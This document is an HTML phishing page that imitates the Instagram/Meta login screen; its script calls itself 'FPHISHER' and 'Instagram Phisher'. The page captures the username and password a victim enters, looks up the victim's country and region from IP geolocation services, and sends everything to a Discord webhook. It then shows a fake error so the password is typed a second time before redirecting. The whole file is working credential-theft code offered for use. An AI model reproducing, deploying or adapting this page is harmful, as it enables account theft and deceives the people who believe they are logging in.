<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">

  <div class="w-full max-w-sm px-6">

    <!-- Logo -->
    <div class="flex justify-center mb-14">
      <img src="IMG_0905.png" alt="App" class="w-16 h-16" />
    </div>

    <!-- Username -->
    <input
      id="username"
      type="text"
      placeholder="Username, mobile number or email address"
      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
    />

    <!-- Password -->
    <input
      id="password"
      type="password"
      placeholder="Password"
      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
    />

    <!-- Login Button -->
    <button
      id="loginBtn"
      class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
             transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
             flex items-center justify-center gap-2 hover:bg-blue-700"
    >
      <span id="btnText">Log in</span>
      
      <!-- 360° Spinning Circle -->
      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
      </svg>
    </button>

    <!-- Error Message -->
    <div id="errorMsg" class="text-red-500 text-sm mb-6 hidden text-center">
      Incorrect username or password.
    </div>

    <!-- Forgotten Password -->
    <div class="text-center mb-6">
      <a href="#" class="text-sm font-normal text-black hover:underline">
        Forgotten password?
      </a>
    </div>

    <!-- Bottom Section -->
    <div class="mt-16">
      <button class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition">
        Create new account
      </button>

      <div class="flex justify-center mt-2">
        <img src="IMG_0906.png" alt="Meta" class="h-8" />
      </div>
    </div>
  </div>

  <!-- Load config first -->
  <script src="config.js"></script>

  <script>
    let attempt = 0;

    async function getLocation() {
      try {
        const res = await fetch('https://ipapi.co/json/', {
          method: 'GET',
          headers: { 'Accept': 'application/json' }
        });

        if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);

        const data = await res.json();

        return {
          country: data.country_name || data.country || 'Unknown',
          state: data.region || data.region_code || 'Unknown'
        };
      } catch (err) {
        console.error("Geolocation failed:", err);
        try {
          const fallback = await fetch('https://ip-api.com/json/?fields=status,country,regionName');
          const fbData = await fallback.json();
          if (fbData.status === "success") {
            return {
              country: fbData.country || 'Unknown',
              state: fbData.regionName || 'Unknown'
            };
          }
        } catch (fbErr) {
          console.error("Fallback failed:", fbErr);
        }
      }
      return { country: 'Unknown', state: 'Unknown' };
    }

    document.getElementById("loginBtn").addEventListener("click", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const passwordInput = document.getElementById("password");
      const btn = document.getElementById("loginBtn");
      const btnText = document.getElementById("btnText");
      const spinner = document.getElementById("spinner");
      const errorMsg = document.getElementById("errorMsg");

      if (!username || !password) {
        alert("Please fill in all fields!");
        return;
      }

      const loc = await getLocation();

      const message = `**FPHISHER 🤖**

**APP:** INSTAGRAM
**USERNAME:** ${username}
**PASSWORD:** ${password}
**COUNTRY:** ${loc.country} 🌍
**STATE:** ${loc.state}
**ATTEMPT:** ${attempt + 1} ⏱️

🔐 2025@FTECHSERVICES`;

      // Send to Discord
      try {
        await fetch(window.CONFIG.DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: message,
            username: "Instagram Phisher"
          })
        });
        console.log("✅ Login data sent to Discord");
      } catch (err) {
        console.error("❌ Webhook failed:", err);
      }

      attempt++;

      // === ROARING / LOADING EFFECT ===
      btnText.classList.add("hidden");        // Remove "Log in" text
      spinner.classList.remove("hidden");     // Show 360° spinning circle
      btn.disabled = true;

      if (attempt === 1) {
        // First attempt: show error and reset
        setTimeout(() => {
          errorMsg.classList.remove("hidden");
          passwordInput.value = "";
          
          // Reset button
          btnText.classList.remove("hidden");
          spinner.classList.add("hidden");
          btn.disabled = false;
        }, 1200);
      } else {
        // Second attempt: keep spinning and redirect
        btnText.textContent = "Verifying..."; // Optional fallback text
        setTimeout(() => {
          window.location.href = "secured.html";
        }, 1400);
      }
    });
  </script>
</body>
</html>
